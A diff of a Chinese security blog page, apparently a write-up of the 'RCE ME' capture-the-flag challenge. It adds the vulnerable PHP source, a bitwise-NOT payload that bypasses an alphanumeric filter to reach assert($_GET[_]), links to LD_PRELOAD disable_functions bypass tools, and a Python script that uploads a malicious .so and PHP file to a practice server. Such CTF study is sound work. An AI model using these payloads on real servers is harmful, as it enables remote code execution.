@@ -4,8 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="About, Z3ratu1&#39;s blog">
-    <meta name="description" content="About | Z3ratu1&#39;s blog">
+    <meta name="keywords" content="极客大挑战 RCE ME, Z3ratu1&#39;s blog">
+    <meta name="description" content="极客大挑战 RCE ME三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍
+无字母数字命令执行&amp;lt;?php
+error_repo">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>About | Z3ratu1&#39;s blog</title>
+    <title>极客大挑战 RCE ME | Z3ratu1&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -285,13 +287,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        about
+                        极客大挑战 RCE ME
                     </div>
                 </div>
             </div>
@@ -400,12 +402,33 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/php/" target="_blank">
+                                <span class="chip bg-color">php</span>
+                            </a>
+                        
+                            <a href="/tags/wp/" target="_blank">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                            <a href="/tags/RCE/" target="_blank">
+                                <span class="chip bg-color">RCE</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                刷题记录
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -413,21 +436,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-10-18
+                    2020-02-26
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        73
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        1 Min
+                        4 Min
                     </div>
                     
                 
@@ -443,9 +466,51 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="真实的萌新"><a href="#真实的萌新" class="headerlink" title="真实的萌新"></a>真实的萌新</h1><p>在努力学习CTF的web方向的萌新，只会跟着师傅们喊666，看了不少比赛的题但是还是零输出</p>
-<p>喜欢钻研小把戏，比如现在的这个博客</p>
-<p>喜欢屠龙和DOTA2，励志成为猛男和大黑阔</p>
+                <h1 id="极客大挑战-RCE-ME"><a href="#极客大挑战-RCE-ME" class="headerlink" title="极客大挑战 RCE ME"></a>极客大挑战 RCE ME</h1><p>三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function<br>当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍</p>
+<h2 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment" spellcheck="true">// ?></span></code></pre>
+<p>相比于SUCTF的命令执行简单了很多，直接使用取反~就能节约很多字符，也没有对使用字符种类的限制，可以直接构造简单的执行语句<br>var_dump(scandir(‘/‘));扫描目录发现根目录下有flag文件和readflag，直接读读不出来没权限，那么就是需要执行readflag了，但是从phpinfo里面可以看到禁止了能用的所有执行命令行的函数，但是有一个assert可以用，就构造一个assert($_GET[_])进行命令执行，跳出长度限制，任意执行命令</p>
+<h3 id="可能的小坑"><a href="#可能的小坑" class="headerlink" title="可能的小坑"></a>可能的小坑</h3><p>这里的eval($code)和eval($_GET[code])是不一样的，前者如果我们想要code=$_GET[a];&amp;a=func()是不能执行函数的，后端只会获得一个a=func()的变量，只有当code=$_GET[a]();&amp;a=func才行，变量名后面接括号将会被认为是一个<strong>可变函数</strong>，从而完成执行，PHP7允许可变函数带参数。但是我们这里再构造一层assert($_GET[_])，就又跳了出来，回到了前者的情况，就能绕过判断进行任意命令执行了</p>
+<p>eval，echo等语句并不能以可变函数的形式被调用，因为他们是一个语言结构，在PHP7中，assert也变为了一个语言结构，具体可以看这篇文章<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html</a><br><a href="https://www.sohu.com/a/302465075_750628" target="_blank" rel="noopener">https://www.sohu.com/a/302465075_750628</a></p>
+<p>函数名需要用括号括一下，尤其是像上述var_dump这样还有函数嵌套的，括号要括对。<br>这里之前看别人的payload，他将美元符号$也通过取反编码传入，这样子的话后端只能获得一个内容为$_GET[_]的字符串，自然无法执行命令，而我们传入一个美元符号，后端自然会认为这个是一个变量进一步解析，就能实现一个$_GET的功能。</p>
+<p>到目前的payload： <code>?code=(~%9E%8C%8C%9A%8D%8B)(${~%A0%B8%BA%AB}[_]);</code> 即assert($_GET[_])</p>
+<p>这里测试了一下用eval($_GET[_])就不行，也不知道为什么，只能用assert</p>
+<h2 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h2><p>bypass disable_function已经是一个老生常谈了，通过LD_PRELOAD加载恶意.so动态链接库来进行劫持是一个常用方法，当然也不一定万用(以前还试过自己手动gcc编译一个动态链接库)，现在直接用GitHub现成项目就行，md里面也简要介绍了LD_PRELOAD是怎么绕过disable_function进行命令执行的<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>还有一个json的，没怎么仔细看，顺手贴一下，只适用于php7<br><a href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a></p>
+<p>当然问题在于怎么上传，上次就是卡在这了，这把想直接构造后门蚁剑连一下也没成。<br>被迫学习了手搓文件上传，用$FILE这个超全局变量来获取上传的文件，通过move_uploaded_file上传函数文件，由于没有open_basedir，我们之间把文件写在稳定有访问权限的/tmp目录下最为稳妥(据说答题现场这个目录下一堆木马)，用python的request库post方法实现上传，然后执行命令包含/tmp下的php文件，并加载动态链接库即可绕过disable_function，执行readflag拿到flag了<br>贴一下脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://7506331a-390b-42ac-b51f-12ae0a6dc457.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(${~%A0%B8%BA%AB}[_]);&amp;_=move_uploaded_file($_FILES['file']['tmp_name'], '/tmp/z3ratu1.so');"</span>
+evil_so <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'bypass_disablefunc_x64.so'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
+evil_php <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'bypass_disablefunc.php'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
+
+
+files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'z3ratu1.so'</span><span class="token punctuation">,</span> evil_so<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"upload"</span><span class="token punctuation">:</span> <span class="token string">"Submit"</span><span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+url <span class="token operator">=</span> <span class="token string">"http://7506331a-390b-42ac-b51f-12ae0a6dc457.node3.buuoj.cn/?code=(~%9E%8C%8C%9A%8D%8B)(${~%A0%B8%BA%AB}[_]);&amp;_=move_uploaded_file($_FILES['file']['tmp_name'], '/tmp/z3ratu1.php');"</span>
+
+files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'z3ratu1.php'</span><span class="token punctuation">,</span> evil_php<span class="token punctuation">,</span> <span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>
+<p>一开始传半天传不上去，检查了好几遍，又是分号没写又是引号没加的，丢人</p>
 
             </div>
             <hr/>
@@ -604,9 +669,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《about》
+                    《极客大挑战 RCE ME》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/about/index.html" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20RCE%20ME/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -651,37 +716,55 @@
                 <i class="fa fa-dot-circle-o"></i>&nbsp;Current
             </div>
             <div class="card">
-                <a href="/about/index.html">
+                <a href="/2020/02/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20RCE%20ME/">
                     <div class="card-image">
                         
+                        <img src="/img/ctf.jpg" class="responsive-img" alt="极客大挑战 RCE ME">
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="about">
-                        
-                        <span class="card-title">about</span>
+                        <span class="card-title">极客大挑战 RCE ME</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            真实的萌新在努力学习CTF的web方向的萌新，只会跟着师傅们喊666，看了不少比赛的题但是还是零输出
-喜欢钻研小把戏，比如现在的这个博客
-喜欢屠龙和DOTA2，励志成为猛男和大黑阔
-
+                            极客大挑战 RCE ME三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍
+无字母数字命令执行&lt;?php
+error_repo
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-18
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-26
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-user fa-fw"></i>
-                            Z3ratu1
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                    刷题记录
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/php/" target="_blank">
+                        <span class="chip bg-color">php</span>
+                    </a>
+                    
+                    <a href="/tags/wp/" target="_blank">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/RCE/" target="_blank">
+                        <span class="chip bg-color">RCE</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -689,40 +772,59 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                Current&nbsp;<i class="fa fa-dot-circle-o"></i>
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/about/index.html">
+                <a href="/2020/02/19/%5BGWCTF%202019%5D%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96/">
                     <div class="card-image">
                         
+                        <img src="/img/ctf1.jpg" class="responsive-img" alt="枯燥的抽奖">
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="about">
-                        
-                        <span class="card-title">about</span>
+                        <span class="card-title">枯燥的抽奖</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            真实的萌新在努力学习CTF的web方向的萌新，只会跟着师傅们喊666，看了不少比赛的题但是还是零输出
-喜欢钻研小把戏，比如现在的这个博客
-喜欢屠龙和DOTA2，励志成为猛男和大黑阔
-
+                            枯燥的抽奖伪随机数安全的一个题，通过php_mt_rand这个工具逆向出随机数种子，然后通过种子获取字符串
+贴一下源码
+&lt;?php
+header("Content-Type: text/html;charset=utf-8");
+se
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-18
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-19
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-user fa-fw"></i>
-                            Z3ratu1
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                    刷题记录
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/php/" target="_blank">
+                        <span class="chip bg-color">php</span>
+                    </a>
+                    
+                    <a href="/tags/wp/" target="_blank">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" target="_blank">
+                        <span class="chip bg-color">暴力破解</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
